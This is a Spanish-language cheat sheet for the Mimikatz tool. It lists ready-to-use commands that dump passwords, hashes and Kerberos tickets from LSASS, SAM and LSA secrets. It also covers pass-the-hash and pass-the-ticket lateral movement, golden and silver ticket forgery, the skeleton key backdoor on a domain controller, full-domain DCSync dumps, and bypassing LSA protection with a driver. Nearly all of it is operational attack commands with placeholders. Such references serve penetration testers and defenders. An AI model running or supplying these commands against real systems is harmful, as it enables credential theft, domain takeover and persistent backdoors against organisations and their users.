title: "Mimikatz Cheat Sheet"
description: "La navaja suiza para extracción de credenciales, manipulación de tickets y ataques avanzados en Windows."

# Mimikatz

**Mimikatz** es la herramienta más conocida para la extracción de credenciales en texto claro, hashes, códigos PIN y tickets Kerberos de la memoria. También permite realizar ataques de Pass-the-Hash, Pass-the-Ticket o construir Golden Tickets.

[Repositorio Oficial](https://github.com/gentilkiwi/mimikatz)

## Comandos Básicos

Siempre inicia con privilegios de administrador local.

```powershell
# Habilitar privilegios de depuración (necesario para tocar LSASS)
privilege::debug

# Elevar a SYSTEM (opcional pero útil)
token::elevate
```

## Extracción de Credenciales (LSASS)

*   **Logon Passwords**: Intenta extraer passwords y hashes de sesiones activas.
    `sekurlsa::logonpasswords`
*   **Tickets Kerberos**: Lista tickets en memoria.
    `sekurlsa::tickets`
    `sekurlsa::tickets /export` (Guarda los tickets como archivos .kirbi en disco).
*   **DPAPI (Master Keys)**:
    `sekurlsa::dpapi`
*   **SAM (Base de datos local)**:
    `lsadump::sam`
*   **LSA Secrets (Secretos de servicios)**:
    `lsadump::secrets`

## Movimiento Lateral

### Pass-the-Hash (PtH)
Inicia un proceso (cmd.exe) usando el hash NTLM de un usuario, sin saber su contraseña.

```powershell
sekurlsa::pth /user:<Usuario> /domain:<Dominio> /ntlm:<HashNTLM>
```

### Pass-the-Ticket (PtT)
Inyecta un ticket Kerberos (.kirbi) en la sesión actual.

```powershell
kerberos::ptt ticket.kirbi
```

## Persistencia y Tickets Dorados

### Golden Ticket (TGT Falsificado)
Requiere el hash NTLM de la cuenta `krbtgt`. Da acceso total al dominio por 10 años (por defecto).

```powershell
kerberos::golden /user:Administrator /domain:<Dominio> /sid:<SID_Dominio> /krbtgt:<Hash_krbtgt> /id:500 /groups:512 /ptt
```

### Silver Ticket (TGS Falsificado)
Requiere el hash NTLM de una cuenta de servicio (ej: cuenta de máquina). Da acceso a ese servicio específico en esa máquina.

```powershell
kerberos::golden /domain:<Dominio> /sid:<SID_Dominio> /target:<TargetMachine> /service:<Service> /rc4:<Hash_Servicio> /user:FakeUser /ptt
```
*Servicios comunes*: `cifs` (archivos), `host` (tareas programadas/wmi), `http` (WinRM/IIS).

### Skeleton Key
Inyecta un backdoor en memoria en el DC. Todas las contraseñas originales siguen funcionando, pero añade una contraseña maestra ("mimikatz") que funciona para TODOS los usuarios.

```powershell
misc::skeleton
```

### DCSync
Extrae credenciales simulando ser un Controlador de Dominio (requiere permisos de replicación).

```powershell
# Dumpear un usuario específico
lsadump::dcsync /user:<Dominio>\<Usuario>

# Dumpear historial de contraseñas
lsadump::dcsync /user:<Dominio>\<Usuario> /history

# Dumpear todo el dominio (Cuidado: Muy ruidoso y lento en dominios grandes)
lsadump::dcsync /domain:<Dominio> /all
```

## Evasión de LSA Protection

Si Windows tiene LSA Protection activado (RunAsPPL), Mimikatz no puede leer LSASS directamente.

1.  **Cargar Driver**: `!+` (Carga mimidriver.sys).
2.  **Desproteger Proceso**: `!processprotect /process:lsass.exe /remove`
3.  **Dumpear**: `sekurlsa::logonpasswords`
